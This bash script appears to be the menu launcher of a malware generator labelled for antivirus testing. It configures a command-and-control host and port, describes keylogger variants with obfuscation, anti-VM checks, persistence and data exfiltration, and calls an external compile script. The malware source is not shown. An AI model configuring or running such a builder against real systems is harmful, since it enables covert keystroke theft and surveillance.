#!/bin/bash

cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║              MALWARE GENERATOR FOR AV TESTING               ║
║                                                              ║
║  FOR TESTING PURPOSES ONLY. Use in isolated environments.    ║
╚═══════════════════════════════════════════════════════════════╝

EOF

PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

export C2_HOST="example.com"
export C2_PORT=443
export UPLOAD_ENDPOINT="/api/upload"
export DOWNLOAD_ENDPOINT="/api/download"

configure_urls() {
    echo ""
    echo "=== C2 Configuration ==="
    echo ""
    echo "Press ENTER to use defaults (example.com:443) or enter custom values:"
    echo ""
    
    read -p "C2 Host (e.g., c2.example.com): " input
    if [ -n "$input" ]; then
        export C2_HOST="$input"
    fi
    
    read -p "C2 Port [443]: " input
    if [ -n "$input" ]; then
        export C2_PORT="$input"
    fi
    
    echo ""
    echo "Advanced endpoints (for medium/complex variants):"
    read -p "Upload endpoint [/api/upload]: " input
    if [ -n "$input" ]; then
        export UPLOAD_ENDPOINT="$input"
    fi
    
    read -p "Download endpoint [/api/download]: " input
    if [ -n "$input" ]; then
        export DOWNLOAD_ENDPOINT="$input"
    fi
    
    echo ""
    echo "[*] Using:"
    echo "    C2 Host: $C2_HOST"
    echo "    C2 Port: $C2_PORT"
    echo "    Upload: $UPLOAD_ENDPOINT"
    echo "    Download: $DOWNLOAD_ENDPOINT"
    echo ""
}

show_menu() {
    echo ""
    echo "=== Malw Generator Menu ==="
    echo ""
    echo "MALWARE VARIANTS:"
    echo "  1) Simple"
    echo "     - Keylogger (console capture)"
    echo "     - HTTPS C2 connection"
    echo "     - XOR string obfuscation"
    echo "     - Anti-VM detection"
    echo "     - Persistence (registry/startup)"
    echo ""
    echo "  2) Medium"
    echo "     - Enhanced keylogger"
    echo "     - Encrypted C2 communication"
    echo "     - Polymorphic encoding"
    echo "     - Unique build ID per compilation"
    echo "     - Anti-VM + Persistence"
    echo ""
    echo "  3) Complex"
    echo "     - Advanced keylogger"
    echo "     - Multi-layer obfuscation (PRNG, polymorphic)"
    echo "     - HTTPS C2 with upload/download"
    echo "     - System info exfiltration"
    echo "     - Session-based identification"
    echo "     - Anti-VM + Persistence"
    echo ""
    echo "COMPILATION:"
    echo "  4) Compile ALL (Linux)"
    echo "  5) Compile ALL (Windows .bat)"
    echo "  6) Configure C2 URLs"
    echo ""
    echo "  0) Exit"
    echo ""
    echo -n "Select option: "
}

generate_simple() {
    echo "[*] Simple Variant"
    echo "    Location: $PROJECT_ROOT/malw/simple/simple_malw.c"
    echo ""
    echo "    Features:"
    echo "    - Console keylogger capture"
    echo "    - HTTPS C2 to $C2_HOST"
    echo "    - XOR obfuscated strings"
    echo "    - Random delays via PRNG"
    echo "    - Anti-VM detection"
    echo "    - Persistence mechanism"
}

generate_medium() {
    echo "[*] Medium Variant"
    echo "    Location: $PROJECT_ROOT/malw/medium/medium_malw.c"
    echo ""
    echo "    Features:"
    echo "    - Enhanced keylogger"
    echo "    - Multi-layer packet encoding"
    echo "    - Unique build ID per compilation"
    echo "    - Randomized encryption keys"
    echo "    - Anti-VM detection"
    echo "    - Persistence mechanism"
}

generate_complex() {
    echo "[*] Complex Variant"
    echo "    Location: $PROJECT_ROOT/malw/complex/complex_malw.c"
    echo ""
    echo "    Features:"
    echo "    - Advanced keylogger with evasion"
    echo "    - Xorshift96 PRNG anti-analysis"
    echo "    - HTTPS C2 with full upload/download"
    echo "    - System reconnaissance"
    echo "    - Polymorphic transformations"
    echo "    - Anti-VM detection"
    echo "    - Persistence mechanism"
}

while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            generate_simple
            ;;
        2)
            generate_medium
            ;;
        3)
            generate_complex
            ;;
        4)
            echo ""
            echo "[*] Running Linux compilation..."
            chmod +x "$PROJECT_ROOT/compilers/compile_linux.sh" 2>/dev/null
            bash "$PROJECT_ROOT/compilers/compile_linux.sh"
            ;;
        5)
            echo ""
            echo "[*] Windows compilation script ready at:"
            echo "    $PROJECT_ROOT/compilers/compile_windows.bat"
            ;;
        6)
            configure_urls
            ;;
        0)
            echo ""
            echo "[*] Goodbye!"
            exit 0
            ;;
        *)
            echo "[!] Invalid option"
            ;;
    esac
done
